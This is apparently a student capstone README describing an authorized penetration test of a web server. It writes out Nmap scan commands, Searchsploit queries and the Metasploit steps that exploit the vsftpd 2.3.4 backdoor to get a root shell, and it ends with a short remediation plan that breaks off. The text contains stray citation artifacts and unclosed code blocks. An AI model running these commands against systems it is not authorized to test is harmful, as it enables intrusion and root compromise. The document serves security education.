# network-penetration-testing-capstone
Authorized penetration testing, vulnerability assessment, and exploit validation against a remote web server using Nmap and the Metasploit framework
# Information Security & Assurance Capstone: Web Server Penetration Testing

## 📌 Project Overview
[cite_start]This repository contains the documentation, methodologies, and technical logs for my Master’s Capstone Project in Information Security/Information Assurance at Johnson & Wales University. [cite_start]The objective of this project was to perform an authorized, controlled penetration test against a designated remote target server environment to identify architecture vulnerabilities, execute exploit proofs-of-concept, and evaluate systemic security weaknesses[cite: 136, 137].

The testing pipeline strictly follows standard offensive security frameworks: **Reconnaissance, Scanning, Vulnerability Analysis, Exploitation, and Post-Exploitation Remediation.**

---

## 🛠️ Technical Stack & Tools
* **Operating System:** Kali Linux
* [cite_start]**Reconnaissance & Scanning:** Nmap (Network Mapper) 
* [cite_start]**Exploitation Framework:** Metasploit (msfconsole) 
* **Vulnerability Assessment:** Searchsploit, Common Vulnerabilities and Exposures (CVE) Database

---

## 🔍 Execution Methodology & Phases

### Phase 1: Reconnaissance & Port Scanning
[cite_start]Comprehensive network discovery was conducted utilizing `Nmap` to map the target infrastructure, fingerprint open ports, identify active services, and detect the host operating system.

```bash
# Executing an aggressive, service-version detection scan with default scripts enabled
nmap -sV -sC -O -v -p- <target_ip>

```bash
# Query the local Exploit Database archive for verified vulnerabilities matching the service signature
searchsploit "Apache 2.4.7"

searchsploit "vsftpd 2.3.4"

### Phase 2: Vulnerability Analysis
Using the service banners collected during the scanning phase, structural vulnerabilities were cross-referenced with public exploit repositories using local tools and open-source intelligence:

## Open the Metasploit console infrastructure:
msfconsole
## Query database for targeted exploit vectors matching the software version signature:
search vsftpd_234_backdoor
## Load the target module payload:
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.50

### Phase 3: Exploitation and Payload Delivery
Execute the attack vector to establish a remote command shell interface:
exploit
## Result: Command shell successfully opened. Accessing target environment using systemic root-level permissions.

### Phase 4: Remediation Plan
**Patch Deployment: Upgrade the legacy server platform to the latest stable release.
**Firewall Access Control Policies: Restrict inbound traffic on Port 21 to designated secure administrative jump boxe


